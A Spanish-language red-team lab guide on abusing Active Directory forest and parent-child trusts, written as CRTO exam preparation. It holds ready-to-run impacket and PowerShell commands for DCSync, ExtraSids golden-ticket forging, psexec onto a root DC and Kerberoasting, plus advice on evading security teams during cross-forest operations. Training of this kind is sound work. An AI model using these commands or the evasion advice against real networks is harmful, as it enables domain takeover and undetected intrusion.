# Tradecraft — Operación DEEP WATER
## Lab-13: Forest Trusts Avanzados y Preparación CRTO

**Operación:** DEEP WATER | **Adversario:** APT10 (Stone Panda) | **Nivel:** Enterprise Simulation  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [Forest Trusts avanzados — Más allá de ExtraSids](#1-forest-trusts-avanzados)
2. [Parent-Child Trust — Escalada entre dominios del mismo forest](#2-parent-child-trust)
3. [One-Way Trust Abuse](#3-one-way-trust-abuse)
4. [Cross-Forest ACL Abuse](#4-cross-forest-acl-abuse)
5. [Preparación CRTO — Gap analysis y estrategia](#5-preparación-crto)
6. [Simulación de examen CRTO](#6-simulación-de-examen-crto)
7. [OPSEC — Operaciones cross-forest avanzadas](#7-opsec)

---

## 1. Forest Trusts Avanzados — Más allá de ExtraSids

### Recapitulación de conceptos de Lab-06

En Lab-06 cubrimos los fundamentos de Forest Trusts. En este lab profundizamos en:
- Trusts bidireccionales con SID Filtering habilitado (bypass)
- Abuso de configuraciones de trust con Foreign Security Principals
- Kerberos Delegation cross-forest
- Explotación de ADCS en entornos multi-forest

### Foreign Security Principals (FSP)

Cuando se añade un usuario de Forest B a un grupo de Forest A, AD crea un **Foreign Security Principal** en Forest A representando ese usuario. Los FSPs pueden tener permisos en Forest A.

```powershell
# Enumerar FSPs en el dominio
Get-ADObject -Filter { objectClass -eq "foreignSecurityPrincipal" } \
  -Properties * | Select-Object Name, memberOf

# Identificar qué grupos tienen FSPs con privilegios
Get-ADGroupMember "Domain Admins" | Where-Object { $_.objectClass -eq "foreignSecurityPrincipal" }
```

### ADCS en entornos multi-forest

Si existe un Forest Trust y el forest B tiene una CA Enterprise, los usuarios del forest A pueden solicitar certificados de la CA del forest B (si así está configurado). Esto puede crear paths de escalada inesperados.

```bash
# Enumerar CAs accesibles cross-forest
certipy find -u usuario@forest-a.local -p password \
  -dc-ip DC-FOREST-A \
  -target forest-b.local
```

---

## 2. Parent-Child Trust — Escalada entre dominios del mismo forest

### El ataque más común en multi-dominio

En un forest con múltiples dominios (parent-child), comprometer cualquier dominio hijo da acceso al dominio raíz via ExtraSids. Este es el ataque más frecuente en engagements enterprise con AD multi-dominio.

### Flujo completo Parent-Child → Forest Root

```
1. Comprometer dominio hijo (dev.atackcorp.local)
2. DCSync en dominio hijo → krbtgt hash del hijo
3. Obtener SID de Enterprise Admins del forest root
4. Forjar ticket con ExtraSids = EA SID del root
5. Acceder al forest root como Enterprise Admin
```

### Con impacket — flujo completo

```bash
# Paso 1: DCSync en dominio hijo
impacket-secretsdump dev.atackcorp.local/Administrador:password@dev-dc.dev.atackcorp.local \
  -just-dc-user krbtgt

# Paso 2: Obtener SID del dominio hijo y forest root
impacket-lookupsid dev.atackcorp.local/Administrador:password@dev-dc.dev.atackcorp.local 0
# S-1-5-21-DEV-SID (dominio hijo)

impacket-lookupsid atackcorp.local/Administrador:password@dc-01.atackcorp.local 0
# S-1-5-21-ROOT-SID (forest root)

# Paso 3: Forjar ticket con ExtraSids
impacket-ticketer \
  -nthash DEV_KRBTGT_HASH \
  -domain-sid S-1-5-21-DEV-SID \
  -domain dev.atackcorp.local \
  -extra-sid S-1-5-21-ROOT-SID-519 \  # Enterprise Admins
  Administrador

# Paso 4: Usar el ticket
export KRB5CCNAME=Administrador.ccache
impacket-psexec -k -no-pass DC-01.atackcorp.local
```

### Verificar si SID Filtering bloquea el ataque

```powershell
# Si SID Filtering está habilitado en el trust, el ExtraSids es filtrado
# Verificar:
Get-ADTrust -Filter * | Select-Object Name, SIDFilteringQuarantined

# Si SIDFilteringQuarantined = True → ExtraSids bloqueado
# Si SIDFilteringQuarantined = False → ataque funciona
```

---

## 3. One-Way Trust Abuse

### Trusts unidireccionales

Un trust unidireccional `A → B` significa que los usuarios de A pueden acceder a recursos de B, pero no al revés.

```
Dominio A ──(confía en)──→ Dominio B
Usuarios de A pueden acceder a B
Usuarios de B NO pueden acceder a A
```

### Abuso desde el lado que confía (A)

Si comprometemos el dominio A (el que confía), podemos:

```bash
# Kerberoastear cuentas de servicio en B
impacket-GetUserSPNs dominio-A/usuario:password \
  -target-domain dominio-B \
  -dc-ip DC-A \
  -request

# Enumerar usuarios de B desde A
impacket-GetADUsers dominio-A/usuario:password \
  -target-domain dominio-B \
  -dc-ip DC-A
```

### Abuso desde el lado confiado (B)

Si comprometemos el dominio B (el confiado), los usuarios de A pueden acceder a nuestros recursos. Podemos:

1. Crear recursos "atractivos" en B con credenciales para capturar autenticaciones de usuarios de A
2. Usar Responder/ntlmrelayx para capturar hashes NTLMv2 de usuarios de A que intentan acceder a B

---

## 4. Cross-Forest ACL Abuse

### ACLs cross-forest en la práctica

Cuando se establece un Forest Trust bidireccional, es común que los administradores añadan grupos de un forest a ACLs del otro por comodidad. Estos permisos cross-forest crean attack paths inesperados.

```bash
# Enumerar ACLs cross-forest con BloodHound/AzureHound
# AzureHound muestra paths que incluyen objetos de múltiples forests

# Con PowerView — buscar ACLs de usuarios de otro forest
Get-DomainObjectAcl -Domain atackcorp.local -ResolveGUIDs |
  Where-Object { $_.SecurityIdentifier -like "S-1-5-21-OTHER-FOREST-SID*" }
```

### Escenario típico de cross-forest ACL abuse

```
Forest A: atackcorp.local
Forest B: corp.local (confiado por A)

Configuración errónea: IT-Admin@corp.local tiene GenericWrite sobre
  el objeto dominio de atackcorp.local

Ataque:
1. Comprometer IT-Admin@corp.local
2. Añadir DCSync rights a nuestra cuenta en corp.local
3. DCSync en atackcorp.local desde corp.local
```

---

## 5. Preparación CRTO — Gap Analysis y Estrategia

### ¿Qué es el CRTO?

El CRTO (Certified Red Team Operator) de Zero-Point Security (RastaMouse) es una certificación práctica de 48 horas en un entorno de lab que cubre:
- AD attacks (Kerberos, ACL, Delegation, GPO)
- C2 con Cobalt Strike
- AV/EDR evasion
- Forest Trusts
- ADCS

### Cobertura del roadmap vs syllabus CRTO

| Módulo CRTO | Labs que lo cubren | Estado |
|-------------|-------------------|--------|
| C2 & Infrastructure | Lab-01/02/10/11 | ✅ |
| Recon & Enumeration | Lab-01/04 | ✅ |
| Kerberos Attacks | Lab-01/05 | ✅ |
| Lateral Movement | Lab-01/02/04 | ✅ |
| Credential Theft | Lab-01/07 | ✅ |
| Domain Dominance | Lab-01/05 | ✅ |
| ADCS | Lab-03 | ✅ |
| Forest Trusts | Lab-06/13 | ✅ |
| AV/EDR Evasion | Lab-08/10 | ✅ |
| Initial Compromise | Lab-09 | ✅ |
| LAPS | Lab-07 | ✅ |
| Data Hunting | Lab-04/12 | ✅ |
| GPO Abuse | Lab-01/06 | ✅ |

### Diferencias técnicas CRTO vs este roadmap

| CRTO | Este roadmap | Equivalencia |
|------|-------------|-------------|
| Cobalt Strike | Sliver + Havoc | Conceptos idénticos — solo sintaxis diferente |
| SnapLabs (nube) | VirtualBox local | Mayor control, mismos conceptos |
| Examen 48h continuo | Labs progresivos | Preparación más profunda |

### Estrategia para el examen CRTO

El examen CRTO consiste en comprometer un entorno AD en 48 horas. Basándose en el roadmap:

```
Primeras 2h:  Reconocimiento + BloodHound
2-4h:         Initial Access si no hay credenciales
4-6h:         Escalada de privilegios
6-10h:        Movimiento lateral hacia objetivos
10-14h:       Comprometer crown jewels
14-16h:       Persistencia
16-20h:       Documentación y capturas
20-24h:       Revisión y limpieza
```

---

## 6. Simulación de Examen CRTO

### Metodología de práctica

Antes del examen, practicar la metodología completa en el entorno del roadmap sin guía:

```
1. Arrancar el entorno Lab-01 sin leer ningún writeup
2. Aplicar metodología CRTO: Recon → Initial Access → Enumerate → Escalate → Persist
3. Documentar todo en tiempo real
4. Comparar con la documentación del lab
5. Identificar gaps y repetir
```

### Checklist de habilidades CRTO

```
□ Configurar C2 listener y generar payload en < 5 minutos
□ Enumerar AD completo con BloodHound sin ayuda
□ Identificar path hacia DA en grafo de BloodHound
□ AS-REP Roasting y Kerberoasting sin consultar comandos
□ Pass-the-Hash y Pass-the-Ticket
□ DCSync
□ Golden Ticket y Diamond Ticket
□ Unconstrained Delegation
□ Constrained Delegation S4U2Proxy
□ RBCD
□ Shadow Credentials
□ GPO Abuse
□ ACL Abuse (WriteDACL, GenericWrite)
□ ADCS ESC1 y ESC4
□ LAPS lectura
□ Forest Trust ExtraSids
□ AMSI bypass básico
□ Pivoting con reverse port forwards
□ Documentar todo en tiempo real
```

---

## 7. OPSEC — Operaciones cross-forest avanzadas

### El reto del OPSEC en entornos multi-forest

En entornos multi-forest hay múltiples SOCs — cada forest puede tener su propio equipo de seguridad. El tráfico cross-forest es más visible porque cruza fronteras de red.

### Reducir la huella cross-forest

```bash
# Preferir enumerar desde dentro del forest objetivo
# en lugar de hacer queries cross-forest desde el exterior

# En lugar de:
impacket-GetUserSPNs forest-a.local/user:pass -target-domain forest-b.local

# Comprometer primero un usuario en forest-b y luego enumerar localmente:
evil-winrm -i forest-b-dc -u user@forest-b.local -p pass
# → enumerar desde dentro
```

### Tiempos de operación cross-forest

Las operaciones cross-forest generan más logs porque:
- Tráfico entre DCs de distintos forests es menos frecuente que intra-forest
- Los logs de autenticación aparecen en múltiples DCs
- Los analistas pueden correlacionar actividad entre forests

**Recomendación:** Limitar las operaciones cross-forest a ventanas de mantenimiento o momentos de alta actividad de red.

---

## Referencias

- [Harmj0y — A Guide to Attacking Domain Trusts](https://posts.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [CRTO Course — Zero-Point Security](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
- [MITRE ATT&CK — APT10](https://attack.mitre.org/groups/G0045/)
- [Forest Trust abuse — dirkjanm](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)

---

*Operación DEEP WATER — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*